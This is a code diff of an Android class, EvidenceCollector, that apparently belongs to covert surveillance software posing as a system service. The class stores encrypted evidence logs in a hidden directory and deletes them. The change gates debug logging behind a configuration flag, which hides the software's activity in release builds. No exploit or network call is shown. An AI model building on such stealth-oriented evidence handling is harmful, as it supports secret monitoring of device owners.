@@ -21,9 +21,8 @@ import java.util.Vector;
 import android.content.Context;
 import android.util.Log;
 
-import com.android.service.Debug;
 import com.android.service.Status;
-import com.android.service.agent.AgentConf;
+import com.android.service.auto.Cfg;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
 import com.android.service.file.AutoFile;
@@ -136,7 +135,7 @@ public class EvidenceCollector {
 	 * Removes the progressive.
 	 */
 	public synchronized void removeProgressive() {
-		Log.d("QZ", TAG + " Info: Removing Progressive");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Removing Progressive");
 		final Context content = Status.getAppContext();
 		content.deleteFile(PROG_FILENAME);
 	}
@@ -158,7 +157,7 @@ public class EvidenceCollector {
 
 			fos.close();
 		} catch (final IOException e) {
-			Log.d("QZ", TAG + " Error: " + e.toString());
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
 		}
 
 		return progessive;
@@ -181,7 +180,7 @@ public class EvidenceCollector {
 			fos.write(Utils.intToByteArray(logProgressive));
 			fos.close();
 		} catch (final IOException e) {
-			Log.d("QZ", TAG + " Error: " + e.toString());
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
 		}
 
 		return logProgressive;
@@ -258,12 +257,12 @@ public class EvidenceCollector {
 	 *            the log name
 	 */
 	public void remove(final String logName) {
-		// Log.d("QZ", TAG + " Removing file: " + logName);
+		// if(AutoConfig.DEBUG) Log.d("QZ", TAG + " Removing file: " + logName);
 		final AutoFile file = new AutoFile(logName);
 		if (file.exists()) {
 			file.delete();
 		} else {
-			Log.d("QZ", TAG + " Warn: " + "File doesn't exists: " + logName);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "File doesn't exists: " + logName);
 		}
 	}
 
@@ -275,7 +274,7 @@ public class EvidenceCollector {
 	 * @return the int
 	 */
 	public synchronized int removeHidden() {
-		Log.d("QZ", TAG + " (removeHidden)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (removeHidden)");
 		int removed = removeRecursive(new File(Path.hidden()), Integer.MAX_VALUE);
 		return removed;
 	}
@@ -297,7 +296,7 @@ public class EvidenceCollector {
 			//fc = new File(basePath);
 
 			if (basePath.isDirectory()) {
-				Log.d("QZ", TAG + " (removeRecursive): " + basePath.getName());
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (removeRecursive): " + basePath.getName());
 				final File[] fileLogs = basePath.listFiles();
 
 				for (final File file : fileLogs) {
@@ -308,7 +307,7 @@ public class EvidenceCollector {
 			}
 			
 			if (!basePath.delete()) {
-				Log.d("QZ",
+				if(Cfg.DEBUG) Log.d("QZ",
 						TAG + " (removeRecursive) Error: "
 								+ basePath.getAbsolutePath());
 			} else {
@@ -316,9 +315,9 @@ public class EvidenceCollector {
 			}
 
 		} catch (final Exception e) {
-			Log.d("QZ", TAG + " Error: removeLog: " + basePath + " ex: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: removeLog: " + basePath + " ex: " + e);
 		}
-		Log.d("QZ", TAG + " removeLogRecursive removed: " + numLogsDeleted);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " removeLogRecursive removed: " + numLogsDeleted);
 		return numLogsDeleted;
 
 	}
@@ -346,16 +345,16 @@ public class EvidenceCollector {
 					if (fdir.isDirectory()) {
 
 						vector.addElement(dir + "/");
-						Log.d("QZ", TAG + " scanForDirLogs adding: " + dir);
+						if(Cfg.DEBUG) Log.d("QZ", TAG + " scanForDirLogs adding: " + dir);
 					}
 				}
 
 			}
 
 		} catch (final Exception e) {
-			Log.d("QZ", TAG + " Error: scanForDirLogs: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: scanForDirLogs: " + e);
 		}
-		Log.d("QZ", TAG + " scanForDirLogs #: " + vector.size());
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " scanForDirLogs #: " + vector.size());
 		return vector;
 	}
 
@@ -396,9 +395,9 @@ public class EvidenceCollector {
 					final String plainName = decryptName(file);
 					map.put(plainName, file);
 				} else if (file.endsWith(EvidenceCollector.LOG_TMP)) {
-					Log.d("QZ", TAG + " ignoring temp file: " + file);
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " ignoring temp file: " + file);
 				} else {
-					Log.d("QZ", TAG + " Info: wrong name, deleting: " + fcDir
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: wrong name, deleting: " + fcDir
 							+ "/" + file);
 					final File toDelete = new File(fcDir, file);
 					toDelete.delete();
@@ -406,11 +405,11 @@ public class EvidenceCollector {
 			}
 
 		} catch (final Exception e) {
-			Log.d("QZ", TAG + " Error: scanForLogs: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: scanForLogs: " + e);
 		} finally {
 
 		}
-		Log.d("QZ", TAG + " scanForLogs numDirs: " + map.size());
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " scanForLogs numDirs: " + map.size());
 		final Collection<String> val = map.values();
 
 		return map.values().toArray(new String[] {});
